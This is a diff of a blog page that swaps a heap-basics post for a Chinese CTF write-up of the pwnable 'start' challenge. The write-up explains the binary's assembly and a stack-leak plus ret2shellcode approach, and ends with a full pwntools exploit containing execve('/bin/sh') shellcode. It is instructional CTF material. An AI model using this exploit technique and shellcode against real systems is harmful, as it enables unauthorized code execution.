@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/09/29/堆基础知识/"/>
+  <link rel="canonical" href="http://example.com/2022/12/04/pwnable-start/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -32,19 +32,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>堆基础知识 - Chen</title>
+  <title>pwnable_start - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="堆基础知识">
-<meta property="og:url" content="http://example.com/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index.html">
+<meta property="og:title" content="pwnable_start">
+<meta property="og:url" content="http://example.com/2022/12/04/pwnable-start/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="从堆部分开始 我们可以认为自己已经初步成为了一名pwn手 大部分的比赛的题目其实都是堆 这是一个复杂的知识块 接下来 我们将花费数月的时间来学习他 什么是堆[ 回顾一下学习栈时的内存分布 我们注意到了堆和栈的不同点 栈是由高地址向低地址增长 而堆是由低地址向高地址增长 并且栈是程序加载进内存后就会生成，而堆需要相关函数(比如malloc，free等)后才会生成 更进一步来说堆是动态分配的（由操作系">
+<meta property="og:description" content="一道很有趣的题目 原理基础ret2shellcode 但是考查了汇编代码的阅读以及栈结构的理解 还有内平栈 涉及到的知识点还是很多的 这里讲细一点 内平栈外平栈程序分析checksec看一下保护机制 123456[*] &amp;#x27;&#x2F;home&#x2F;chen&#x2F;pwn&amp;#x27;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-09-29T05:05:29.000Z">
-<meta property="article:modified_time" content="2022-10-01T10:23:48.736Z">
+<meta property="article:published_time" content="2022-12-04T12:54:30.000Z">
+<meta property="article:modified_time" content="2022-12-05T05:29:08.607Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2363,7 +2363,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/29/堆基础知识/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/04/pwnable-start/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2384,7 +2384,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        堆基础知识
+        pwnable_start
       </h1>
       <div class='new-meta-box'>
         
@@ -2403,10 +2403,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E5%A0%86/">堆</a>
+    <a class="category-link" href="/categories/wp/">wp</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E5%A0%86/" itemprop="url"><span itemprop="name">堆</span></a>
+        <a href="/categories/wp/" itemprop="url"><span itemprop="name">wp</span></a>
       </span>
     
   </div>
@@ -2415,10 +2415,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-09-29T13:05:29+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-12-04T20:54:30+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Sep 29, 2022</p>
+    <p>发布于：Dec 4, 2022</p>
   </a>
 </div>
 
@@ -2441,21 +2441,79 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>从堆部分开始 我们可以认为自己已经初步成为了一名pwn手 大部分的比赛的题目其实都是堆 这是一个复杂的知识块 接下来 我们将花费数月的时间来学习他</p>
-<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>[<img src="https://s1.328888.xyz/2022/09/20/28iN7.webp" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/20/28iN7.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="28iN7.webp"></p>
-<p>回顾一下学习栈时的内存分布</p>
-<p>我们注意到了堆和栈的不同点</p>
-<p>栈是由高地址向低地址增长 而堆是由低地址向高地址增长</p>
-<p>并且栈是程序加载进内存后就会生成，而堆需要相关函数(比如malloc，free等)后才会生成</p>
-<p>更进一步来说堆是动态分配的（由操作系统内核或者堆管理器）</p>
-<p>再来了解一些名词</p>
-<h3 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h3><p>类似于linux内核这样的存在 就是管理系统调用申请的内存</p>
-<p><img src="https://s1.328888.xyz/2022/10/01/MSnmE.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/01/MSnmE.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="MSnmE.png"></p>
-<p>其中linux用到的就是glbc</p>
-<p>并且，堆管理器并不是由操作系统实现的，而是由libc.so.6链接库实现，封装了一些系统调用，为用户提供高效便捷的动态内存分配接口和管理系统调用申请来的内存</p>
-<h3 id="arean"><a href="#arean" class="headerlink" title="arean"></a>arean</h3><p>arean相当于堆管理器的内存池，即内存分配区</p>
-<p><img src="https://s1.328888.xyz/2022/10/01/MSRtw.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/01/MSRtw.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="MSRtw.png"></p>
-<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位</p>
+    <p>一道很有趣的题目 原理基础ret2shellcode 但是考查了汇编代码的阅读以及栈结构的理解 还有内平栈</p>
+<p>涉及到的知识点还是很多的 这里讲细一点</p>
+<h2 id="内平栈"><a href="#内平栈" class="headerlink" title="内平栈"></a>内平栈</h2><h2 id="外平栈"><a href="#外平栈" class="headerlink" title="外平栈"></a>外平栈</h2><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下保护机制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>保护机制全部关闭 再ida看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+
+<p>应该不是用c语言编译的 很干净 只有一个exit函数和start函数 反编译后看不出什么所以然</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0x3C00000003</span>LL;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span>     <span class="number">80</span>h; LINUX - sys_write</span><br><span class="line">    <span class="type">int</span>     <span class="number">80</span>h; LINUX -</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里直接解读汇编吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br></pre></td></tr></table></figure>
+
+<p>前面6行对这个栈帧进行了初始化的操作 push入栈了esp 接着入栈了返回地址为exit函数</p>
+<p>随后对于四个寄存器进行了归零操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br></pre></td></tr></table></figure>
+
+<p>16进制转化成人话就是: <strong>Let’s start the CTF:</strong></p>
+<p>这里的五次push 使得esp指向减少了0x14</p>
+<p>此时的栈帧结构为:</p>
+<p><img src="https://pic1.imgdb.cn/item/638cc09e16f2c2beb1c163c2.png" class="lazyload" data-srcset="https://pic1.imgdb.cn/item/638cc09e16f2c2beb1c163c2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h</span><br></pre></td></tr></table></figure>
+
+<p>接着把esp所指向的内存空间赋值给了ecx 这里可以看到ida识别出来了 其被作为一个函数的addr参数 这个函数是什么先别急 我们一行一行看</p>
+<p>这里出现了一个新的寄存器名称 为什么只是dl？ 并且在ida中我们选中其 会和edx一起关联起来 二者有什么关系？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。</span><br><span class="line">4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。</span><br><span class="line"></span><br><span class="line">Eax是32位寄存器，ax是16位寄存器,al(ah)是八位寄存器</span><br><span class="line"></span><br><span class="line">Eax可以存储的数字是DWORD（双字）ax存储的是WORD（字）AL(AH)存储的是BYTE（字节），那么为什么又有AH和AL呢，我们可以这样理解，AX=AH+AL，AH存储的是AX的高８位数据，AL存储的是AX的低八位数据。H这里就是HIGH,Ｌ就是LOW.</span><br><span class="line"></span><br><span class="line">取自https://blog.csdn.net/EVEPITWANG/article/details/89447466</span><br></pre></td></tr></table></figure>
+
+<p>相当于给这个函数赋值了长度参数(ida识别出来的len)</p>
+<p>那么接下来的bl寄存器同理 相当于ebx的低8位 赋值为了1</p>
+<p>重点来了 eax的低八位被赋值为了4 随后进行了int 0x80 也就是系统调用</p>
+<p>那么我们查询一下调用号为4的函数是什么 发现是write函数</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29343201/article/details/52209588">(5条消息) linux 系统调用号表_Anciety的博客-CSDN博客_系统调用号</a></p>
+<p>那么上述汇编代码翻译成c语言也就是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>,esp,<span class="number">0x14</span>)</span><br></pre></td></tr></table></figure>
+
+<p>所以 相当于输出了上面push入栈的那0x14字节的数据 也就是输出了相应的字符串</p>
+<p>但是这里注意一下 栈仍然是不变的 此时栈的结构和esp指针仍然是保留原状(即上文的图所示)</p>
+<p>接下来再看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br></pre></td></tr></table></figure>
+
+<p>赋值了两个参数 edx(参数len)为0x3c eax(系统调用号)为3 还有xor ebx,ebx相当于ebx赋为0</p>
+<p>调用号3是read函数 也就是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>,esp,<span class="number">0x3c</span>)</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以在esp指针指向的地方 输入0x3c字节数据</p>
+<p>接着看剩下的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br></pre></td></tr></table></figure>
+
+<p>使esp寄存器的值增加0x14 此时esp指向的是存放offset _exit地址的空间</p>
+<p>随后retn指令相当于pop eip 也就是控制程序执行流到exit函数 进行一个退出</p>
+<p>在retn过后 此时栈帧就只剩下一个old esp了</p>
+<p>分析完了程序 那么我们来想一下利用的思路</p>
+<p>我们拥有栈溢出的机会 并且得知了具体哪一块栈空间可以用来控制程序执行流 并且保护全关</p>
+<p>没有system函数也没有泄露libc的机会 也没有足够的栈溢出长度来供我们使用onegadget生成的shellcode直接pwn</p>
+<p>那么这时候想到的是ret2shellcode 我们只能在栈上写入shellcode 但是没有bss段供我们写入的机会 所以只能写在栈上</p>
+<p>那么要做的就是泄露栈上的地址 想一下 程序唯一能够利用输出的地方也就是write函数那边了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br></pre></td></tr></table></figure>
+
+<p>看到第一个 mov ecx,esp 我们再联想到 retn指令执行完了以后 栈帧只剩下了old esp 并且此时esp仍然指向old esp 此时如果执行</p>
+<p>这一行指令 那么ecx的值就会被赋为old esp 也就是程序会输出old esp 也就是泄露了栈地址</p>
+<p>所以我们第一次写入的payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x14</span>)+p32(<span class="number">0x8048087</span>)</span><br><span class="line"><span class="comment">#0x14字节的垃圾数据用来填充push入栈的那串字符串 p32(0x8048087)覆盖的是offset _exit 用来控制程序执行流</span></span><br></pre></td></tr></table></figure>
+
+<p>此时程序就会输出old esp 那么接下来又要怎么利用</p>
+<p>我们知道 控制程序执行流利用的是retn这个指令 但是在其生效前 esp指针会被抬高0x14字节</p>
+<p>所以我们需要0x14字节的垃圾数据 然后再往栈上写入shellcode存放的地址 然后控制程序执行流到shellcode</p>
+<p>这一系列的操作用图演示为;</p>
+<p><img src="https://pic.imgdb.cn/item/638d8069b1fccdcd360c696a.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/638d8069b1fccdcd360c696a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>所以此时eip接收到了stack_addr(我们泄露的栈地址)+0x14</p>
+<p>其寻址到shllcode的栈空间 于是我们就获取了shell</p>
+<p>完整的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x14</span>)+p32(<span class="number">0x8048087</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">shellcode = <span class="string">b&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#这里不能用pwntools生成的shellcode 估计是太长了 溢出空间不够</span></span><br><span class="line">payload = cyclic(<span class="number">0x14</span>)+p32(stack_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
 
   </div>
   
@@ -2480,10 +2538,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-01T18:23:48+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-12-05T13:29:08+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Oct 1, 2022</p>
+    <p>更新于：Dec 5, 2022</p>
   </a>
 </div>
 
@@ -2502,7 +2560,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&title=堆基础知识 - Chen&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/12/04/pwnable-start/&title=pwnable_start - Chen&summary="
           
           >
           
@@ -2514,7 +2572,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&title=堆基础知识 - Chen&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/12/04/pwnable-start/&title=pwnable_start - Chen&summary="
           
           >
           
@@ -2526,7 +2584,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&title=堆基础知识 - Chen&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/12/04/pwnable-start/&title=pwnable_start - Chen&summary="
           
           >
           
@@ -2559,19 +2617,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/09/29/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>虚拟机安装</p>
-          <p class='content'>虚拟机对于pwn手而言必不可缺，本人直到完成栈的大部分学习后，都没有搭建一个自己的虚拟机
-所以这个系列将记录我安装的过程，和安装过程中出现的问题
-下载vmware这个不手把手教，因为我已经下过了...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/'>
-          <p class='title'>栈迁移<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决
-今天所要讲到的内容，也是和栈溢出字节数不够有关
-当可以供我们编写的字节数...</p>
+        <a class='next' href='/2022/11/28/unlink/'>
+          <p class='title'>unlink<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>很多时候 堆题的操作都是篡改got表 从而getshell 为了达到这一目的 就需要我们得到任意地址写的机会
+其中unlink就是一个典型的办法
+其主要分为两种情况 向后合并和向前合并
+向后合并...</p>
         </a>
       
     </div>
@@ -2587,7 +2639,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/12/04/pwnable-start/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2629,7 +2681,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A0%86"><span class="toc-text">什么是堆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-text">堆管理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arean"><span class="toc-text">arean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk"><span class="toc-text">chunk</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%B9%B3%E6%A0%88"><span class="toc-text">内平栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E5%B9%B3%E6%A0%88"><span class="toc-text">外平栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-text">程序分析</span></a></li></ol>
     </div>
   </section>
 
@@ -3203,7 +3255,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/堆/","name":"堆"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/09/29/堆基础知识/","name":"堆基础知识"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"堆基础知识","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","wordCount":0,"datePublished":"2022-09-29T05:05:29.000Z","dateModified":"2022-10-01T10:23:48.736Z","articleSection":"堆","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
